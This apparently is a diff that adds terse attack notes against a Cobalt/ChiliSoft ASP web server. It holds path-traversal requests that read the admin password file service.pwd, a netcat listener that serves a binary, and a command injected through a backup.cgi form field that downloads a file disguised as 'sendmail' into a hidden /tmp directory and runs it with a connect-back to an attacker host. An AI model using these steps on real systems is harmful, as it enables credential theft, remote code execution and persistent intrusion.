@@ -1,0 +1,14 @@
+telnet 127.0.0.1 80
+GET /caspsamp/tour/tourcodebrws.asp?source=/caspsamp/../admin/conf/service.pwd HTTP/1.0
+telnet 127.0.0.1 80
+GET /caspsamp/401K/content/code.asp?source=/caspsamp/../admin/conf/service.pwd HTTP/1.0
+
+(echo -e "HTTP/1.0 200\n";cat noserver ) | /usr/bin/nc -vv -l -p 5533
+
+-nrtun 5322
+
+http://127.0.0.1:81/cgi-bin/.cobalt/backup/backup.cgi
+Fill in Frequency: Daily
+Location:
+PI:/tmp`mkdir /tmp/.scsi;cd /tmp/.scsi;wget http://PI:5533/sendmail -Osendmail;chmod +x sendmail;PATH=. D=-cPI:5322 sendmail`
+<Save Changes>
